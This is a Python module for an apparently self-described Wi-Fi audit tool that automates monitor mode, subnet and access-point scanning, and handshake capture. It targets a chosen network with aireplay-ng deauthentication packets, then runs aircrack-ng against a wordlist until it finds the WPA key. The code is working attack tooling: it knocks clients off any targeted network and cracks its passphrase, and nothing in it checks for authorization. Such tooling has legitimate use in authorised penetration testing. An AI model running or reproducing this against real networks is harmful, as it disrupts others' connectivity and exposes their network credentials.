"""Full audit workflow: monitor mode, handshake capture, capture analysis."""

import os
import re
import time
import subprocess
import shutil
from pathlib import Path

from core.run import run as _run, run_live as _run_live


PROJECT_DIR = Path(__file__).resolve().parent.parent
STORAGE_DIR = PROJECT_DIR / "storage"
CAPTURES_DIR = STORAGE_DIR / "captures"
WORDLISTS_DIR = STORAGE_DIR / "wordlists"
REPORTS_DIR = STORAGE_DIR / "reports"

for d in [STORAGE_DIR, CAPTURES_DIR, WORDLISTS_DIR, REPORTS_DIR]:
    d.mkdir(parents=True, exist_ok=True)


# ─── Monitor Mode ─────────────────────────────────────────

def monitor_start(iface: str) -> str:
    return _run(["sudo", "airmon-ng", "start", iface])


def monitor_stop(iface: str) -> str:
    return _run(["sudo", "airmon-ng", "stop", iface])


def get_monitor_iface(base_iface: str = "wlp2s0") -> str:
    """Detect the monitor-mode interface (usually wlp2s0mon or wlp2s0)."""
    out = _run(["iwconfig"], timeout=5)
    for line in out.split("\n"):
        if "Mode:Monitor" in line:
            iface = line.split()[0]
            return iface
    return base_iface


def is_monitor_mode(iface: str) -> bool:
    out = _run(["iwconfig", iface], timeout=5)
    return "Mode:Monitor" in out


# ─── Capture Management ────────────────────────────────────

def get_capture_files() -> list[dict]:
    files = []
    for f in sorted(CAPTURES_DIR.iterdir(), key=os.path.getmtime, reverse=True):
        if f.suffix in (".cap", ".pcap", ".pcapng", ".csv", ".kismet.csv", ".ivs"):
            size = f.stat().st_size
            files.append({
                "name": f.name,
                "path": str(f),
                "size_kb": round(size / 1024, 1),
                "ext": f.suffix,
                "mtime": time.strftime("%Y-%m-%d %H:%M", time.localtime(f.stat().st_mtime)),
            })
    return files


def get_handshakes(cap_path: str) -> list[dict]:
    """Use aircrack-ng to list handshakes in a cap file."""
    out = _run(["aircrack-ng", "-s", cap_path], timeout=30)
    handshakes = []
    for line in out.split("\n"):
        m = re.search(r"(\d+)\s+handshake.*?\[([A-F0-9:]{17})", line, re.IGNORECASE)
        if m:
            handshakes.append({"bssid": m.group(2), "count": m.group(1)})
        m = re.search(r"\[\s*(\d+)\s*\]\s+Handshake.*?\[([A-F0-9:]{17})", line, re.IGNORECASE)
        if m:
            handshakes.append({"bssid": m.group(2), "count": m.group(1)})
    return handshakes if handshakes else []


def analyze_cap(cap_path: str) -> dict:
    """Analyze a capture file: count packets, APs, handshakes."""
    result = {"path": cap_path, "size_kb": 0, "aps": 0, "handshakes": 0, "packets": 0, "error": None}
    if not os.path.exists(cap_path):
        result["error"] = "File not found"
        return result
    result["size_kb"] = round(os.path.getsize(cap_path) / 1024, 1)
    out = _run(["aircrack-ng", "-s", cap_path], timeout=30)
    for line in out.split("\n"):
        m = re.search(r"Found (\d+) handshake", line)
        if m:
            result["handshakes"] = int(m.group(1))
        m = re.search(r"Found (\d+) APs?", line)
        if m:
            result["aps"] = int(m.group(1))
        m = re.search(r"Total packets:\s*(\d+)", line)
        if m:
            result["packets"] = int(m.group(1))
    return result


def get_session_dir(session_name: str = None) -> Path:
    if session_name is None:
        session_name = time.strftime("session_%Y%m%d_%H%M%S")
    session_dir = CAPTURES_DIR / session_name
    session_dir.mkdir(parents=True, exist_ok=True)
    return session_dir


# ─── Full Audit Workflow ───────────────────────────────────

def full_audit(iface: str, line_callback=None) -> dict:
    """Run full audit: network scan → AP discovery → capture."""
    report = {"steps": [], "errors": [], "captures": [], "session_dir": None}
    session = get_session_dir()
    report["session_dir"] = str(session)

    def log(msg):
        if line_callback:
            line_callback(msg)

    # Step 1: System info
    log("[cyan]Step 1/4: System info[/]")
    report["steps"].append("system_info")
    log(_run(["uname", "-a"]))

    # Step 2: Network scan
    log("[cyan]Step 2/4: Network scan (nmap ping)[/]")
    report["steps"].append("network_scan")
    log(_run(["nmap", "-sn", "192.168.1.0/24", "-oN", str(session / "nmap_ping.txt")]))

    # Step 3: AP scan
    log("[cyan]Step 3/4: AP scan (airodump)[/]")
    report["steps"].append("ap_scan")
    prefix = str(session / "airodump")
    _run(["timeout", "10", "airodump-ng", iface, "--band", "bg",
          "--write", prefix, "--output-format", "csv"])
    csv_path = f"{prefix}-01.csv"
    if os.path.exists(csv_path):
        report["captures"].append(csv_path)
        with open(csv_path) as f:
            content = f.read()
        log(f"  AP scan saved: {os.path.basename(csv_path)}")
        log(content[:2000])

    # Step 4: Bettercap probe (if available)
    log("[cyan]Step 4/4: Bettercap network probe (if available)[/]")
    if shutil.which("bettercap"):
        report["steps"].append("bettercap_probe")
        _run(["timeout", "8", "bettercap", "-eval",
              "net.probe on; sleep 3; net.show",
              "-no-history", "-no-colors"],
             timeout=10)

    log("[green]Full audit complete.[/]")
    log(f"[bold]Session saved to:[/] {session}")
    return report


# ─── Handshake Capture ────────────────────────────────────

def capture_handshake(bssid: str, channel: str, essid: str,
                      iface: str, timeout: int = 60,
                      line_callback=None) -> dict:
    """Target a specific AP and capture a WPA handshake."""
    result = {"success": False, "cap_path": None, "error": None}
    session = get_session_dir(f"handshake_{bssid.replace(':', '')}")
    prefix = str(session / "capture")

    def log(msg):
        if line_callback:
            line_callback(msg)

    log(f"[yellow]Targeting: {essid} ({bssid}) on channel {channel}[/]")
    log(f"[yellow]Capturing on {iface} — deauth will be sent...[/]")

    mon = get_monitor_iface(iface)

    # Start airodump in background targeting this AP
    proc = subprocess.Popen(
        ["airodump-ng", "--bssid", bssid, "--channel", channel,
         "--write", prefix, "--output-format", "pcap", mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(2)

    # Send deauth to try to capture handshake
    log("[yellow]Sending deauth packets...[/]")
    deauth = subprocess.run(
        ["aireplay-ng", "--deauth", "5", "-a", bssid, mon],
        capture_output=True, text=True, timeout=15
    )
    log(deauth.stdout[:500] or "[yellow]Deauth sent[/]")

    # Wait for capture
    log(f"[cyan]Listening for handshake ({timeout}s max)...[/]")
    time.sleep(timeout)

    # Stop airodump
    proc.terminate()
    proc.wait()

    # Find the .cap file
    cap_file = None
    for f in Path(session).iterdir():
        if f.suffix == ".cap":
            cap_file = str(f)
            break

    if cap_file:
        result["cap_path"] = cap_file
        analysis = analyze_cap(cap_file)
        if analysis["handshakes"] > 0:
            result["success"] = True
            log(f"[green]Handshake captured! {analysis['handshakes']} handshake(s)[/]")
        else:
            log("[yellow]Capture saved but no handshake detected yet[/]")
        log(f"[bold]Saved to:[/] {cap_file}")
    else:
        result["error"] = "No .cap file generated"
        log(f"[red]{result['error']}[/]")

    return result


# ─── Crack WPA Handshake ──────────────────────────────────

def crack_handshake(cap_path: str, wordlist_path: str,
                    bssid: str = None, line_callback=None) -> dict:
    """Run aircrack-ng on a cap file with a wordlist."""
    result = {"key": None, "error": None, "output": ""}

    def log(msg):
        if line_callback:
            line_callback(msg)

    if not os.path.exists(cap_path):
        result["error"] = "Capture file not found"
        return result
    if not os.path.exists(wordlist_path):
        result["error"] = "Wordlist not found"
        return result

    log(f"[cyan]Cracking: {os.path.basename(cap_path)}[/]")
    log(f"[cyan]Wordlist: {os.path.basename(wordlist_path)}[/]")
    log(f"[cyan]Wordlist size: {round(os.path.getsize(wordlist_path) / 1e6, 1)} MB[/]")

    cmd = ["aircrack-ng", "-w", wordlist_path, cap_path]
    if bssid:
        cmd.extend(["--bssid", bssid])

    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = r.stdout + r.stderr
        result["output"] = output
        log(output)

        m = re.search(r"KEY FOUND!\s*\[(.+?)\]", output)
        if m:
            result["key"] = m.group(1)
            log(f"[green]KEY FOUND: {result['key']}[/]")
        elif "Failed" in output or "Passphrase not in" in output:
            log("[yellow]Key not found in wordlist[/]")
        else:
            log("[yellow]Crack result unclear — check output above[/]")
    except subprocess.TimeoutExpired:
        result["error"] = "Cracking timed out (300s)"
        log(f"[red]{result['error']}[/]")

    return result
